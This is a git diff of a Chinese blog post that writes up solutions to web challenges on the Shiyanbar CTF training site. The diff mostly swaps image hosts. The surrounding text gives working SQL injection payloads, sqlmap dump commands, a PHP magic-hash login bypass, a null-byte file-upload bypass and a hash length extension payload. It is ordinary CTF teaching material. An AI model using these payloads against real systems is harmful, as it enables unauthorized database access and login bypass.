@@ -150,6 +150,8 @@
             
             <li><a target="_blank" href="http://twosmi1e.com/">2Smile</a></li>
             
+            <li><a target="_blank" href="/www.bugsafe.cn">Poache’s</a></li>
+            
         </ul>
     </div>
 </div>
@@ -726,7 +728,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2018-10-15 08:40:51'>2018-04-02 16:10</time>
+        创建时间:<time class="date" title='更新时间: 2018-11-02 21:52:17'>2018-04-02 16:10</time>
         
     </div>
     <div class="article-meta">
@@ -777,8 +779,8 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="实验吧web—writeup"><a href="#实验吧web—writeup" class="headerlink" title="实验吧web—writeup"></a>实验吧web—writeup</h1><p>[toc]</p>
-<h3 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h3><p><a href="http://ctf5.shiyanbar.com/10/main.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/10/main.php</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803181631_235.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201803181631_176.png" alt=""></p>
-<h3 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h3><p>查看修改或添加HTTP请求头响应头<br>改X-Forwarded-For: 1.1.1.1<br><a href="http://ctf5.shiyanbar.com/phpaudit/" target="_blank" rel="external">http://ctf5.shiyanbar.com/phpaudit/</a><br><img src="http://oy0tigw51.bkt.clouddn.com/201803181634_594.png" alt=""><br>burp抓包改改X-Forwarded-For: 1.1.1.1<br> <img src="http://oy0tigw51.bkt.clouddn.com/201803181643_54.png" alt=""></p>
+<h3 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h3><p><a href="http://ctf5.shiyanbar.com/10/main.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/10/main.php</a><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181631_235.png" alt=""><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181631_176.png" alt=""></p>
+<h3 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h3><p>查看修改或添加HTTP请求头响应头<br>改X-Forwarded-For: 1.1.1.1<br><a href="http://ctf5.shiyanbar.com/phpaudit/" target="_blank" rel="external">http://ctf5.shiyanbar.com/phpaudit/</a><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181634_594.png" alt=""><br>burp抓包改改X-Forwarded-For: 1.1.1.1<br> <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181643_54.png" alt=""></p>
 <h3 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h3><p><a href="http://ctf5.shiyanbar.com/basic/inject" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject</a> </p>
 <p>注库名<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login" target="_blank" rel="external">http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&amp;pass=123&amp;action=login</a>“ –dbs </p>
 <p>回显</p>
@@ -791,7 +793,7 @@
 <p>Database: test<br>Table: admin<br>[1 entry]<br>+———-+<br>| password |<br>+———-+<br>| idnuenna |<br>+———-+<br>直接登录即可获得flag，</p>
 <p>账号 admin 密码 idnuenna<br>获得key</p>
 <p>恭喜你密码正确！ KEY :!@#WwwN5f0cu5coM</p>
-<h3 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h3><p>Content-Row:响应头内容<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181759_121.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201803181800_592.png" alt=""></p>
+<h3 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h3><p>Content-Row:响应头内容<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181759_121.png" alt=""><br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181800_592.png" alt=""></p>
 <h3 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h3><p><a href="http://ctf5.shiyanbar.com/sHeader/" target="_blank" rel="external">http://ctf5.shiyanbar.com/sHeader/</a><br>进入之后给了提示,需要满足三个条件</p>
 <ol>
 <li>安装 .NET 9.9</li>
@@ -800,9 +802,9 @@
 </ol>
 <p>于是乎构造</p>
 <p>User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/5.0) .NET CLR 9.9<br>Accept-Language: en-gb;</p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201803181805_551.png" alt=""></p>
-<h3 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单!"></a>这个看起来有点简单!</h3><p>Sqlmap -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db –tables<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181824_480.png" alt=""><br>sqlmap.py -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db -T thiskey –columns<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181824_242.png" alt=""></p>
-<p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db -T thiskey -C k0y –dump<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181825_659.png" alt=""><br> 爆字段得到key：whatiMyD91dump</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181805_551.png" alt=""></p>
+<h3 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单!"></a>这个看起来有点简单!</h3><p>Sqlmap -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db –tables<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181824_480.png" alt=""><br>sqlmap.py -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db -T thiskey –columns<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181824_242.png" alt=""></p>
+<p>sqlmap -u “<a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/8/index.php?id=1</a>“ -D my_db -T thiskey -C k0y –dump<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181825_659.png" alt=""><br> 爆字段得到key：whatiMyD91dump</p>
 <p>方法二：<br>输入id=1 and 1=1 显示正常<br>输入id=1 and 1=2 回显错误<br>判断存在SQL注入漏洞（恩）<br>然后判断字段数<br>id=1 order by 1 可以，id=1 order by 2 可以，id=1 order by 3 不行！<br>所以字段数位2<br>id=1 union select 1 错误，id=1 union select 1,2 可以<br>所以字段数位2<br>然后开始爆数据库<br>id=1 union select 1,schema_name from information_schema.schemata</p>
 <p>我们看到爆出了三个库：information_schema、my_db、test</p>
 <p>接下来就是爆my_db的表名(就这个库名比较特别，就它了)<br>id=1 union select 1,table_name from information_schema.tables where table_schema=’my_db’</p>
@@ -831,9 +833,9 @@ Can you authenticate to this website?
 <p>hackerDJ</p>
 <p>%68%61%63%6B%65%72%44%4A</p>
 <p>%2568%2561%2563%256B%2565%2572%2544%254A<br>提交即可获得flag</p>
-<p><a href="http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256B%2565%2572%2544%254A" target="_blank" rel="external">http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256B%2565%2572%2544%254A</a><br>回显<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181831_78.png" alt=""></p>
+<p><a href="http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256B%2565%2572%2544%254A" target="_blank" rel="external">http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256B%2565%2572%2544%254A</a><br>回显<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181831_78.png" alt=""></p>
 <p>flag: DUTCTF{PHP_is_the_best_program_language}</p>
-<h3 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h3><p>直接复制到浏览器的console运行即可<br><img src="http://oy0tigw51.bkt.clouddn.com/201803181833_337.png" alt=""></p>
+<h3 id="what-a-fuck-这是什么鬼东西"><a href="#what-a-fuck-这是什么鬼东西" class="headerlink" title="what a fuck!这是什么鬼东西?"></a>what a fuck!这是什么鬼东西?</h3><p>直接复制到浏览器的console运行即可<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803181833_337.png" alt=""></p>
 <h3 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h3><pre><code>//$_POST[user]意思是读取用户在提交表单时输入的user值，$_POST[PASS]同理
 //如果二者的值都不为空
 if($_POST[user] &amp;&amp; $_POST[pass]) {
@@ -883,8 +885,8 @@ else {
 <p>此时用工具打表的话，意义不大，因为此题目标已经明晰，我们只要让row[pw]的值与pass经过md5之后的值相等即可。 而$pass经过md5之后的值是我们可以通过正常输入控制的。 同时，row[pw]的值是从$sql提取出来的 因此，目标就一句话：只要我们能够修改$sql的值，此题解决。 再次审视注入点：$sql = “select pw from php where user=’$user’”; 在这里我们可以利用sql语句，直接给$sql返回一个值。 也就是说，不需要访问题里的数据库，只要我们修改了$sql的值，此题解决.</p>
 <p>构造</p>
 <p>最终user的框里输入的内容为： ‘AND 0=1 UNION SELECT “c4ca4238a0b923820dcc509a6f75849b” #</p>
-<p>最前面的单引号：闭合原文的where user=’<br>AND 0=1:为了使前面的表达式返回值为空 从而使select pw from php where user=’’ AND 0=1这句话完全没用<br>接着我们使用UNION SELECT “c4ca4238a0b923820dcc509a6f75849b”，直接把MD5值作为返回值retuen给$sql<br>c4ca4238a0b923820dcc509a6f75849b这串MD5值是数字1经过MD5 hash之后的结果<br>最后的#用来注释掉后面没用的东西<br>最终，将’AND 0=1 UNION SELECT “c4ca4238a0b923820dcc509a6f75849b” #输入到user框里，将数字1输入到pass框里，登录成功。<br>或者user=’and 1=0 union select md5(1) #&amp;pass=1<br>key：SimCTF{youhaocongming}<br><img src="http://oy0tigw51.bkt.clouddn.com/201803192336_939.png" alt=""></p>
-<h3 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201803192339_352.png" alt=""></p>
+<p>最前面的单引号：闭合原文的where user=’<br>AND 0=1:为了使前面的表达式返回值为空 从而使select pw from php where user=’’ AND 0=1这句话完全没用<br>接着我们使用UNION SELECT “c4ca4238a0b923820dcc509a6f75849b”，直接把MD5值作为返回值retuen给$sql<br>c4ca4238a0b923820dcc509a6f75849b这串MD5值是数字1经过MD5 hash之后的结果<br>最后的#用来注释掉后面没用的东西<br>最终，将’AND 0=1 UNION SELECT “c4ca4238a0b923820dcc509a6f75849b” #输入到user框里，将数字1输入到pass框里，登录成功。<br>或者user=’and 1=0 union select md5(1) #&amp;pass=1<br>key：SimCTF{youhaocongming}<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803192336_939.png" alt=""></p>
+<h3 id="NSCTF-web200"><a href="#NSCTF-web200" class="headerlink" title="NSCTF web200"></a>NSCTF web200</h3><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803192339_352.png" alt=""></p>
 <p>方法一：</p>
 <pre><code>&lt;?php  
     $_code = &quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;;  
@@ -926,7 +928,7 @@ $_in= base64_decode (strrev(str_rot13 ($str)));
     echo strrev($_out);
 
 ?&gt;
-</code></pre><h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201803200102_440.png" alt=""><br>burp抓包，修改为 uploads/1.php .jpg<br>转到hex编码，将空格20，改为00<br>00截断<br><img src="http://oy0tigw51.bkt.clouddn.com/201803200104_758.png" alt=""></p>
+</code></pre><h3 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h3><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803200102_440.png" alt=""><br>burp抓包，修改为 uploads/1.php .jpg<br>转到hex编码，将空格20，改为00<br>00截断<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803200104_758.png" alt=""></p>
 <h3 id="FALSE"><a href="#FALSE" class="headerlink" title="FALSE"></a>FALSE</h3><p>PHP代码审计<br>hint：sha1函数你有认真了解过吗？听说也有人用md5碰撞o(╯□╰)o<br>解题链接： <a href="http://ctf5.shiyanbar.com/web/false.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/false.php</a> </p>
 <pre><code>&lt;?php
 if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;])) {
@@ -944,7 +946,7 @@ else{
 <p>?name[]=1&amp;password[]=2<br>Flag: CTF{t3st_th3_Sha1}</p>
 <h3 id="Guess-Next"><a href="#Guess-Next" class="headerlink" title="Guess Next"></a>Guess Next</h3><p>写个算法没准就算出来了，23333<br>hint：你确定你有认真看判断条件？</p>
 <p>解题链接： <a href="http://ctf5.shiyanbar.com/web/Session.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/Session.php</a>  </p>
-<p><img src="http://oy0tigw51.bkt.clouddn.com/201803200117_574.png" alt=""><br>burpsuite抓包，将phpsessid置空，并get参数password为空就行。。<br><img src="http://oy0tigw51.bkt.clouddn.com/201803200118_840.png" alt=""><br> CTF{Cl3ar_th3_S3ss1on}</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803200117_574.png" alt=""><br>burpsuite抓包，将phpsessid置空，并get参数password为空就行。。<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803200118_840.png" alt=""><br> CTF{Cl3ar_th3_S3ss1on}</p>
 <h3 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h3><p>啊拉？又是php审计。已经想吐了。<br>hint：ereg()函数有漏洞哩；从小老师就说要用科学的方法来算数。<br>解题链接： <a href="http://ctf5.shiyanbar.com/web/more.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/more.php</a> </p>
 <pre><code>&lt;?php
 if (isset ($_GET[&#39;password&#39;])) {
@@ -998,7 +1000,7 @@ if (isset ($_GET[&#39;password&#39;])) {
 <p>token验证可以用php中的0exxxxxxxx绕过。</p>
 <p>payload：?emailAddress=admin@simplexue.com&amp;token=0e11111111</p>
 <p>flag：SimCTF{huachuan_TdsWX}</p>
-<h3 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201803200134_866.png" alt=""><br>让username的MD5和0相等，可以让MD5以0e开头。<br><a href="http://www.cnblogs.com/Primzahl/p/6018158.html" target="_blank" rel="external">PHP处理0e开头md5哈希字符串缺陷/bug</a></p>
+<h3 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h3><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803200134_866.png" alt=""><br>让username的MD5和0相等，可以让MD5以0e开头。<br><a href="http://www.cnblogs.com/Primzahl/p/6018158.html" target="_blank" rel="external">PHP处理0e开头md5哈希字符串缺陷/bug</a></p>
 <p>username输入QNKCDZO，得到/user.php?fame=hjkleffifer，访问页面看到一段php源码。</p>
 <pre><code>$unserialize_str = $_POST[&#39;password&#39;]; 
 $data_unserialize = unserialize($unserialize_str); 
@@ -1021,7 +1023,7 @@ if ($a == -19827747736161128312837161661727773716166727272616149001823847) {
 <p>flag：ctf{forms_are_easy}</p>
 <h3 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h3><p>题目的意思就是通过改变地址栏访问index.php，但是限制了条件不能使用 ./  ../ \ 而且只能使用小写字母，不可以在php后加点，这里我们可以利用伪静态技术，使用<a href="http://ctf5.shiyanbar.com/indirection/index.php/index.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/indirection/index.php/index.php</a><br>index.php后的index.php会被当做参数处理，所以服务器只会解析第一个index.php，满足条件成功绕过。</p>
 <p>URL重写，其实就是把带一大堆参数的url，变成一个看上去很规矩的url,主要目的是为了搜索引擎。</p>
-<h3 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h3><p>先用burpsuite抓包，发现setcookie中有source=0，在cookie中赋值，将其改为1，得到源代码。<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201255_194.png" alt=""></p>
+<h3 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h3><p>先用burpsuite抓包，发现setcookie中有source=0，在cookie中赋值，将其改为1，得到源代码。<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201255_194.png" alt=""></p>
 <pre><code>$flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;;
 $secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security!
 $username = $_POST[&quot;username&quot;];
@@ -1057,7 +1059,7 @@ admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0
 </code></pre><p>将\x换成%并填入对应位置。<br>hash2</p>
 <p>flag：CTF{cOOkieS_4nd_hAshIng_G0_w3LL_t0g3ther}</p>
 <p>打开网页，查看源代码，获得提示<!-- please post what you find with parameter:key -->，让我们post参数key。</p>
-<p>抓包发现header头中有经过base64编码的flag参数，<br><img src="http://oy0tigw51.bkt.clouddn.com/201803200157_179.png" alt=""><br>将参数解码P0ST_THIS_T0_CH4NGE_FL4G:9x3PyMMd9，将参数9x3PyMMd9post却没有结果，题目中说尽快的提交，猜测与时间有关，用python脚本解</p>
+<p>抓包发现header头中有经过base64编码的flag参数，<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803200157_179.png" alt=""><br>将参数解码P0ST_THIS_T0_CH4NGE_FL4G:9x3PyMMd9，将参数9x3PyMMd9post却没有结果，题目中说尽快的提交，猜测与时间有关，用python脚本解</p>
 <pre><code>import requests,re
 from base64 import b64decode
 s = requests.Session()
@@ -1067,7 +1069,7 @@ head = r.headers
 flag = b64decode(head[&#39;flag&#39;]).split(&#39;:&#39;)[1]
 r1 = s.post(url, data={&#39;key&#39;:flag})
 print r1.text
-</code></pre><h3 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h3><p>1.判断<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201346_982.png" alt=""><br>2.判断过滤<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1 and 1=1<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201347_373.png" alt=""></p>
+</code></pre><h3 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h3><p>1.判断<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201346_982.png" alt=""><br>2.判断过滤<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1 and 1=1<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201347_373.png" alt=""></p>
 <blockquote>
 <p>过滤空格方法</p>
 <ol>
@@ -1097,19 +1099,19 @@ group_concat    groupgroup_concat_concat&#39;    否
 </code></pre><p>3.判断有那些数据库：</p>
 <pre><code>http://ctf5.shiyanbar.com/423/web/
 ?id=1&#39;/**/union/**/select/**/schema_name/**/from/**/information_schema.schemata/**/where/**/&#39;1&#39;=&#39;1
-</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803201407_844.png" alt=""></p>
+</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201407_844.png" alt=""></p>
 <ol>
-<li>查看有哪些数据表：<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’/<strong>/union/</strong>/select/<strong>/table_name/</strong>/from/<strong>/information_schema.tables/</strong>/where/<strong>/‘1’=’1<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201415_889.png" alt=""><br> 发现了flag的表，我们猜测应该是在web1数据库中并且字段就是flag（其实就在本页面的数据库中）<br>故：<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’/</strong>/union/<strong>/select/</strong>/flag/<strong>/from/</strong>/web1.flag/<strong>/where/</strong>/‘1’=’1<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201419_771.png" alt=""><br>方法二：<br>双空格双查询<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’  unionunion  selectselect  flag  fromfrom  flag  wherewhere ‘1’=’1</li>
+<li>查看有哪些数据表：<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’/<strong>/union/</strong>/select/<strong>/table_name/</strong>/from/<strong>/information_schema.tables/</strong>/where/<strong>/‘1’=’1<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201415_889.png" alt=""><br> 发现了flag的表，我们猜测应该是在web1数据库中并且字段就是flag（其实就在本页面的数据库中）<br>故：<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’/</strong>/union/<strong>/select/</strong>/flag/<strong>/from/</strong>/web1.flag/<strong>/where/</strong>/‘1’=’1<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201419_771.png" alt=""><br>方法二：<br>双空格双查询<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="external">http://ctf5.shiyanbar.com/423/web/</a><br>?id=1’  unionunion  selectselect  flag  fromfrom  flag  wherewhere ‘1’=’1</li>
 </ol>
-<p>###简单的sql注入之2<br>用?id=1 and 1=1测试，返回SQLi detected!，这是过滤了and？又尝试了很多关键字，都返回SQLi detected!，那可能是过滤了空格。<br>绕过空格<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201422_573.png" alt=""><br>payload</p>
+<p>###简单的sql注入之2<br>用?id=1 and 1=1测试，返回SQLi detected!，这是过滤了and？又尝试了很多关键字，都返回SQLi detected!，那可能是过滤了空格。<br>绕过空格<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201422_573.png" alt=""><br>payload</p>
 <pre><code>http://ctf5.shiyanbar.com/web/index_2.php/?id=1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1
-</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803201437_337.png" alt=""></p>
+</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201437_337.png" alt=""></p>
 <h3 id="简单的sql注入之3"><a href="#简单的sql注入之3" class="headerlink" title="简单的sql注入之3"></a>简单的sql注入之3</h3><p>注库名</p>
 <pre><code>sqlmap -u &quot;http://ctf5.shiyanbar.com/web/index_3.php?id=1&quot; --dbs
-</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201803201444_689.png" alt=""></p>
+</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201444_689.png" alt=""></p>
 <p>当前数据库<br>Sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php/?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php/?id=1</a>“ –current-db</p>
-<p>注表名<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“ -D “web1” –tables<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201453_629.png" alt=""></p>
-<p>注字段<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“ -D “web1” -T “flag” –columns<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201457_156.png" alt=""><br>注内容<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=123" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=123</a>“ -D “web1” -T “flag” -C “flag” –dump<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201517_635.png" alt=""></p>
+<p>注表名<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“ -D “web1” –tables<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201453_629.png" alt=""></p>
+<p>注字段<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>“ -D “web1” -T “flag” –columns<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201457_156.png" alt=""><br>注内容<br>sqlmap -u “<a href="http://ctf5.shiyanbar.com/web/index_3.php?id=123" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/index_3.php?id=123</a>“ -D “web1” -T “flag” -C “flag” –dump<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201517_635.png" alt=""></p>
 <p>flag{Y0u_@r3_5O_dAmn_90Od}</p>
 <h3 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h3><p><a href="http://ctf5.shiyanbar.com/web/pcat/source.txt" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/pcat/source.txt</a></p>
 <pre><code>&lt;?php
@@ -1168,8 +1170,8 @@ mysql_close($con);
 <h3 id="登录一下好吗？？"><a href="#登录一下好吗？？" class="headerlink" title="登录一下好吗？？"></a>登录一下好吗？？</h3><p>题目地址: <a href="http://ctf5.shiyanbar.com/web/wonderkun/web/index.html" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/wonderkun/web/index.html</a></p>
 <p>在用户名表单里提交一系列字段可以发现题目过滤了几乎所有查询语句，注释，但是没有过滤’，这里的绕过比较巧妙，由于=是从左到到运算的，所以可以人为构造0=0的结果，payload为username=1’=’&amp;password=1’=’，拼接后的语句为:</p>
 <pre><code>select * from user where username=&#39;1&#39;=&#39;&#39; and password=&#39;1&#39;=&#39;&#39;
-</code></pre><p>username=’1’=’’这句，先有username=’1’返回0，然后再和’’比较，mysql中的弱类型比较0和空字符串是相等的，所以能返回1，后面半句同理，所以整句能够返回1，flag为ctf{51d1bf8fb65a8c2406513ee8f52283e7}。<br><img src="http://oy0tigw51.bkt.clouddn.com/201804011614_554.png" alt=""></p>
-<h3 id="你真的会PHP吗？"><a href="#你真的会PHP吗？" class="headerlink" title="*你真的会PHP吗？"></a>*你真的会PHP吗？</h3><p>首先fiddler抓包，在response header中发现hint:6c525af4059b4fe7d8c33a.txt,打开后找到index.php源码<br><img src="http://oy0tigw51.bkt.clouddn.com/201803201958_595.png" alt=""></p>
+</code></pre><p>username=’1’=’’这句，先有username=’1’返回0，然后再和’’比较，mysql中的弱类型比较0和空字符串是相等的，所以能返回1，后面半句同理，所以整句能够返回1，flag为ctf{51d1bf8fb65a8c2406513ee8f52283e7}。<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201804011614_554.png" alt=""></p>
+<h3 id="你真的会PHP吗？"><a href="#你真的会PHP吗？" class="headerlink" title="*你真的会PHP吗？"></a>*你真的会PHP吗？</h3><p>首先fiddler抓包，在response header中发现hint:6c525af4059b4fe7d8c33a.txt,打开后找到index.php源码<br><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201803201958_595.png" alt=""></p>
 <pre><code>&lt;?php
 
 
@@ -1243,7 +1245,7 @@ echo $info;
 <p>1.利用intval函数溢出绕过<br>Intval函数获取变量整数值。<br>函数介绍清点这里<br>Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p>
